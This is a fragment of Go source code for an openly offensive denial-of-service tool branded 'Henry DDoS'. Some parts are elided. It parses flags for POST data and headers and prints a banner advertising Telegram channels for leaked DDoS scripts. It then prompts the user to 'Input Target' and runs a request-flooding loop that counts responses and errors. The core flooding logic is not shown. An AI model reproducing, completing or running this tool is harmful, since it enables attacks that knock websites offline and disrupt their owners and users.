...
func main() {
	...
	flag.StringVar(&data, "data", "", "Data to POST. If present namdos will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	// Print creator information
	fmt.Println("")
	fmt.Println("Henry DDoS | 2024 Cre By @HaiBe")
	fmt.Println("                        ╦ ╦╔═╗╔╗╔╦═╗╦ ╦")
	fmt.Println("                        ╠═╣║╣ ║║║╠╦╝╚╦╝")
	fmt.Println("                        ╩ ╩╚═╝╝╚╝╩╚═ ╩ ")
	fmt.Println("            ╔═══════════════════════════════════════╗")
	fmt.Println("            ║     DDOS HENRY . Version : 1.1.3      ║")
	fmt.Println("            ║-Chanel:  t.me/Leak_ScriptDDoS         ║")
	fmt.Println("            ║-Contact: t.me/HaiBe_Vx                ║")
	fmt.Println("            ║-Rules:   Don't attack gov - edu.      ║")
	fmt.Println("            ╚═══════════════════════════════════════╝")
	fmt.Println("")
	fmt.Println("")

	// If the site is not provided via flags, ask the user to input it
	if site == "" {
		fmt.Print("Input Target: ")
		fmt.Scan(&site)
	}

	t := os.Getenv("Anonymous Vietnam : AnonyHaiBe_Vx")
	...
	if version {
		fmt.Println("Anonymous xGrem", __version__)
		os.Exit(0)
	}
	...
	go func() {
		fmt.Println("-- Anonymous Attack Started --\n           Les'go!\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("Status               |\tResp OK |\tGot error")
		for {
			...
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- Anonymous Attack DDoS 2024 --       \n\n\r")
				os.Exit(0)
			}
		}
	}()
